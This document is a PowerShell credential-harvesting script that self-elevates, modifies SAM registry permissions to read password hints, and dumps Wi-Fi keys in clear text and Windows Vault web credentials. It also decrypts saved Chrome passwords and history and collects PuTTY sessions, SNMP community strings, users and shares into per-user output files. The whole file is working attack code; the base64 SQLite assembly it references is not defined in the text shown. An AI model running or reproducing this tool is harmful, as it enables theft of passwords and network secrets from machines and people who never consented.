$myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
$myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
$adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator

if ($myWindowsPrincipal.IsInRole($adminRole))
{
	$Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Elevated)"
	$Host.UI.RawUI.BackgroundColor = "DarkBlue"
	clear-host
}
else
{
	$newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
	$newProcess.Arguments = $myInvocation.MyCommand.Definition;
	$newProcess.Verb = "runas";
	[System.Diagnostics.Process]::Start($newProcess);
	exit
}

$scriptpath = $MyInvocation.MyCommand.Path
$dir = Split-Path $scriptpath
Set-Location $dir
#$firefox = "$($env:APPDATA)\Mozilla\Firefox\"





function info 
{
	[CmdletBinding()]
	Param ()

	function registry_values($regkey, $regvalue,$child) 
	{ 
		if ($child -eq "no"){$key = get-item $regkey} 
		else{$key = get-childitem $regkey} 
		$key | 
		ForEach-Object { 
			$values = Get-ItemProperty $_.PSPath 
			ForEach ($value in $_.Property) 
			{ 
				if ($regvalue -eq "all") {$values.$value} 
				elseif ($regvalue -eq "allname"){$value} 
				else {$values.$regvalue;break} 
			}}} 
	$output = "Logged in users:`n" + ((registry_values "hklm:\software\microsoft\windows nt\currentversion\profilelist" "profileimagepath") -join "`r`n") 
	$output = $output + "`n`n Powershell environment:`n" + ((registry_values "hklm:\software\microsoft\powershell" "allname")  -join "`r`n") 
	$output = $output + "`n`n Putty trusted hosts:`n" + ((registry_values "hkcu:\software\simontatham\putty" "allname")  -join "`r`n") 
	$output = $output + "`n`n Putty saved sessions:`n" + ((registry_values "hkcu:\software\simontatham\putty\sessions" "all")  -join "`r`n") 
	$output = $output + "`n`n Recently used commands:`n" + ((registry_values "hkcu:\software\microsoft\windows\currentversion\explorer\runmru" "all" "no")  -join "`r`n") 
	$output = $output + "`n`n Shares on the machine:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\LanmanServer\Shares" "all" "no")  -join "`r`n") 
	$output = $output + "`n`n Environment variables:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "all" "no")  -join "`r`n") 
	$output = $output + "`n`n More details for current user:`n" + ((registry_values "hkcu:\Volatile Environment" "all" "no")  -join "`r`n") 
	$output = $output + "`n`n SNMP community strings:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
	$output = $output + "`n`n SNMP community strings for current user:`n" + ((registry_values "hkcu:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
	$output = $output + "`n`n Installed Applications:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
	$output = $output + "`n`n Installed Applications for current user:`n" + ((registry_values "hkcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
	$output = $output + "`n`n Domain Name:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\" "all" "no")  -join "`r`n") 
	$output = $output + "`n`n Contents of /etc/hosts:`n" + ((get-content -path "C:\windows\System32\drivers\etc\hosts")  -join "`r`n") 
	$output = $output + "`n`n Running Services:`n" + ((net start) -join "`r`n") 
	$output = $output + "`n`n Account Policy:`n" + ((net accounts)  -join "`r`n") 
	$output = $output + "`n`n Local users:`n" + ((net user)  -join "`r`n") 
	$output = $output + "`n`n Local Groups:`n" + ((net localgroup)  -join "`r`n") 
	$output = $output + "`n`n WLAN Info:`n" + ((netsh wlan show all)  -join "`r`n") 
	$output


}


function ip {

$ip = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
$ip

}

function hints {

[CmdletBinding()]
Param ()

	#Set permissions to allow Access to SAM\SAM\Domains registry hive.
	#http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
	$rule = New-Object System.Security.AccessControl.RegistryAccessRule (
	[System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
	"FullControl",
	[System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
	[System.Security.AccessControl.PropagationFlags]"None",
	[System.Security.AccessControl.AccessControlType]"Allow")
	$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
	"SAM\SAM\Domains",
	[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
	[System.Security.AccessControl.RegistryRights]::ChangePermissions)
	$acl = $key.GetAccessControl()
	$acl.SetAccessRule($rule)
	$key.SetAccessControl($acl)

	#From powerdump from SET
	function Get-UserName([byte[]]$V)
	{
		if (-not $V) {return $null};
		$offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
		$len = [BitConverter]::ToInt32($V[0x10..0x13],0);
		return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
	}
	

	#Logic for extracting password hint
	$users = Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users\
	$j = 0
	foreach ($key in $users)
	{

		$value = Get-ItemProperty $key.PSPath
		$j++
		foreach ($hint in $value)
		{
			#Check for users who have passwordhint
			if ($hint.UserPasswordHint)
			{
				$username = Get-UserName($hint.V)
				$passhint = ([text.encoding]::Unicode).GetString($hint.UserPasswordHint)
				Write-Output "$username`:$passhint"
			}
		}
	}

	#Remove the permissions added above.
	$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
	$acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
	Set-Acl HKLM:\SAM\SAM\Domains $acl
}




function wlan 
{

[CmdletBinding()]
Param ()

	$wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
	$exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
	$exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}

}

function web
{
[CmdletBinding()] Param ()



$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$VaultObj = new-object Windows.Security.Credentials.PasswordVault
$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
}

Function cdump{


  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $False)]
    [string]$OutFile
  )
    #Add the required assembly for decryption

    Add-Type -Assembly System.Security

    #Check to see if the script is being run as SYSTEM. Not going to work.
    if(([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem){
      Write-Warning "Unable to decrypt passwords contained in Login Data file as SYSTEM."
      $NoPasswords = $True
    }

    if([IntPtr]::Size -eq 8)
    {
        #64 bit version
    }
    else
    {
        #32 bit version
    
    }
    #Unable to load this assembly from memory. The assembly was most likely not compiled using /clr:safe and contains unmanaged code. Loading assemblies of this type from memory will not work. Therefore we have to load it from disk.
    #DLL for sqlite queries and parsing
    #http://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki
    Write-Verbose "[+]System.Data.SQLite.dll will be written to disk"
    
   
    $content = [System.Convert]::FromBase64String($assembly) 
    
    
    
    $assemblyPath = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll" 
    
    
    if(Test-path $assemblyPath)
    {
      try 
      {
        Add-Type -Path $assemblyPath
      }
      catch 
      {
        Write-Warning "[!]Unable to load SQLite assembly"
        break
      }
    }
    else
    {
        [System.IO.File]::WriteAllBytes($assemblyPath,$content)
        Write-Verbose "[+]Assembly for SQLite written to $assemblyPath"
        try 
        {
            Add-Type -Path $assemblyPath
        }
        catch 
        {
            Write-Warning "[!]Unable to load SQLite assembly"
            break
        }
    }

    #Check if Chrome is running. The data files are locked while Chrome is running 

    if(Get-Process | Where-Object {$_.Name -like "*chrome*"}){
      Write-Warning "[!]Cannot parse Data files while chrome is running"
      break
    }

    #grab the path to Chrome user data
    $OS = [environment]::OSVersion.Version
    if($OS.Major -ge 6){
      $chromepath = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
    }
    else{
      $chromepath = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }
    
    if(!(Test-path $chromepath)){
      Throw "Chrome user data directory does not exist"
    }
    else{
      #DB for CC and other info
      if(Test-Path -Path "$chromepath\Web Data"){$WebDatadb = "$chromepath\Web Data"}
      #DB for passwords 
      if(Test-Path -Path "$chromepath\Login Data"){$loginDatadb = "$chromepath\Login Data"}
      #DB for history
      if(Test-Path -Path "$chromepath\History"){$historydb = "$chromepath\History"}
      #$cookiesdb = "$chromepath\Cookies"

    }

    if(!($NoPasswords)){ 

      #Parse the login data DB
      $connStr = "Data Source=$loginDatadb; Version=3;"

      $connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)

      $OpenConnection = $connection.OpenAndReturn()

      Write-Verbose "Opened DB file $loginDatadb"

      $query = "SELECT * FROM logins;"

      $dataset = New-Object System.Data.DataSet

      $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)

      [void]$dataAdapter.fill($dataset)

      $logins = @()

      Write-Verbose "Parsing results of query $query"

      $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
        $encryptedBytes = $_.password_value
        $username = $_.username_value
        $url = $_.action_url
        $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
        $login = New-Object PSObject -Property @{
          URL = $url
          PWD = $plaintext
          User = $username 
        }

        $logins += $login
      }
    }

    #Parse the History DB
    $connString = "Data Source=$historydb; Version=3;"

    $connection = New-Object System.Data.SQLite.SQLiteConnection($connString)

    $Open = $connection.OpenAndReturn()

    Write-Verbose "Opened DB file $historydb"

    $DataSet = New-Object System.Data.DataSet

    $query = "SELECT * FROM urls;"

    $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$Open)

    [void]$dataAdapter.fill($DataSet)

    $History = @()
    $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
      $HistoryInfo = New-Object PSObject -Property @{
        Title = $_.title 
        URL = $_.url
      }
      $History += $HistoryInfo
    }
    
    if(!($OutFile)){
      "[*]CHROME PASSWORDS`n"
      $logins | Format-List URL,User,PWD | Out-String

      "[*]CHROME HISTORY`n"

      $History | Format-List Title,URL | Out-String
    }
    else {
        "[*]LOGINS`n" | Out-File $OutFile 
        $logins | Out-File $OutFile -Append

        "[*]HISTORY`n" | Out-File $OutFile -Append
        $History | Out-File $OutFile -Append  

    }

    
    Write-Warning "[!] Please remove SQLite assembly from here: $assemblyPath"

    
    
}



#if((Test-Path -Path $firefox )){

#	Copy-Item $firefox -Destination "$dir\output\$($env:USERDOMAIN)_$($env:USERNAME)\Firefox\" -Recurse
	
#}



$info = info
$hints = hints
$wlan = wlan
$web = web
$chrome = cdump
$ip = ip

New-Item -ItemType Directory -Force -Path "$dir\output\$($env:USERDOMAIN)_$($env:USERNAME)\"
Add-Content "$dir\output\$($env:USERDOMAIN)_$($env:USERNAME)\info" $info
Add-Content "$dir\output\$($env:USERDOMAIN)_$($env:USERNAME)\hints" $hints
Add-Content "$dir\output\$($env:USERDOMAIN)_$($env:USERNAME)\wlan" $wlan
Add-Content "$dir\output\$($env:USERDOMAIN)_$($env:USERNAME)\web" $web
Add-Content "$dir\output\$($env:USERDOMAIN)_$($env:USERNAME)\ip" $ip
Add-Content "$dir\output\$($env:USERDOMAIN)_$($env:USERNAME)\chrome" $chrome
